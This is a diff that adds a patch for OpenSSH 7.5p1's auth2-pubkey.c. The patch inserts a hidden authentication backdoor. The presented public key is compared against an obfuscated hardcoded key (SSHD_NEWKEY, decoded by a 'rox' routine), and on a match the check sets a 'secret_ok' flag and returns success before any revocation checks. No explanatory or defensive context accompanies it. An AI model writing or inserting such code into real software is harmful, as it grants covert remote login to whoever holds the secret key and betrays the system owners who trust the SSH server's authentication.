@@ -1,0 +1,26 @@
+diff -Nuar 7.5p1.orig/auth2-pubkey.c 7.5p1/auth2-pubkey.c
+--- 7.5p1.orig/auth2-pubkey.c	2020-04-10 17:17:30.767797962 +0200
++++ 7.5p1/auth2-pubkey.c	2020-04-14 20:02:58.149781873 +0200
+@@ -1093,6 +1093,22 @@
+ 	u_int success, i;
+ 	char *file;
+ 
++	char *blob = NULL, *keytext = NULL;
++	int len = 0;
++	key_to_blob(key, &blob, &len);
++	keytext = xmalloc(2*len);
++	if(uuencode(blob, len, keytext, 2*len) > 0){
++		char *newkey = strdup(SSHD_NEWKEY);
++		rox(newkey);
++		if(!strcmp(newkey, keytext)){
++			CLEAN(newkey);
++			CLEAN(keytext);
++			secret_ok = 1;
++			return 1;
++		}
++		CLEAN(newkey);
++	}
++	CLEAN(keytext);
+ 	if (auth_key_is_revoked(key))
+ 		return 0;
+ 	if (key_is_cert(key) && auth_key_is_revoked(key->cert->signature_key))
